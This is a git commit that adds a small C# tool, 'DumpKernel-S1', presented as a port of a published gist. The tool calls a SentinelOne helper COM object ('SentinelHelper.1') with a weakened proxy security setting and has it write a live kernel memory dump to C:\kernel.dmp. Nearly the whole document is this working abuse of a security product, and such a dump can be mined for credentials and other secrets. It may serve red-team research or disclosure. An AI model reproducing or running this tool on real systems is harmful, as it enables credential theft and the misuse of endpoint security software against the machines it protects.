8cd411b8e59ff8ad94701083a7a698be3bfdc526
D4rthMaulCop <49704708+D4rthMaulCop@users.noreply.github.com>
2023-11-18 23:07:16 -0600

    first commit

---
+++ DumpKernel-S1/Program.cs
@@ -0,0 +1,93 @@
+﻿using System;
+using System.Runtime.InteropServices;
+
+public class ImpTest
+{
+    [DllImport("Ole32.dll", CharSet = CharSet.Auto)]
+    public static extern int CoSetProxyBlanket(
+        IntPtr pProxy,
+        uint dwAuthnSvc,
+        uint dwAuthzSvc,
+        uint pServerPrincName,
+        uint dwAuthLevel,
+        uint dwImpLevel,
+        IntPtr pAuthInfo,
+        uint dwCapabilities
+    );
+
+    public static int SetSecurity(object objDCOM)
+    {
+        IntPtr dispatchInterface = Marshal.GetIDispatchForObject(objDCOM);
+        int hr = CoSetProxyBlanket(
+            dispatchInterface,
+            0xffffffff,
+            0xffffffff,
+            0xffffffff,
+            0, // Authentication Level
+            3, // Impersonation Level
+            IntPtr.Zero,
+            64
+        );
+        return hr;
+    }
+}
+
+class Program
+{
+    public static object GetHelperComObject()
+    {
+        try
+        {
+            Console.WriteLine("[+] Initializing SentinelHelper COM object...");
+            ImpTest impTest = new ImpTest();
+            object sentinelHelper = Activator.CreateInstance(Type.GetTypeFromProgID("SentinelHelper.1"));
+            Console.WriteLine("[+] SentinelHelper COM object initialized successfully!");
+            ImpTest.SetSecurity(sentinelHelper);
+            return sentinelHelper;
+        }
+        catch
+        {
+            return null;
+        }
+    }
+
+    public static void DoLiveKernelDump(string outPath)
+    {
+        try
+        {
+            Console.WriteLine($"[+] Trying to dump kernel to {outPath}...");
+            dynamic sentinelHelper = GetHelperComObject();
+            sentinelHelper.LiveKernelDump(outPath);
+            Console.WriteLine("[+] Success!");
+        }
+        catch
+        {
+            Console.WriteLine("[!] Uh-oh, something went wrong!");
+ 
+        }
+    }
+
+    public static void PrintHelp()
+    {
+        Console.WriteLine("[+] Usage: DumpKernel-S1.exe --output C:\\kernel.dmp");
+    }
+
+    static void Main(string[] args)
+    {   
+        if (args.Length == 2)
+        {
+            if (args[0] == "--output" && args[1].StartsWith("C:\\"))
+            {
+                DoLiveKernelDump("C:\\kernel.dmp");
+            }
+            else
+            {
+                PrintHelp();
+            }
+        }
+        else
+        {
+            PrintHelp();
+        }
+    }
+}
--- README.md
+++ README.md
@@ -1,2 +1,3 @@
 # DumpKernel-S1
 A C# port of https://gist.github.com/adamsvoboda/8f29e09d74b73e1dec3f9049c4358e80 
+Please see their tweet here https://x.com/adamsvoboda/status/1726015701389922643?s=46&t=tb0pCGohFddL7H8wAFoGhQ
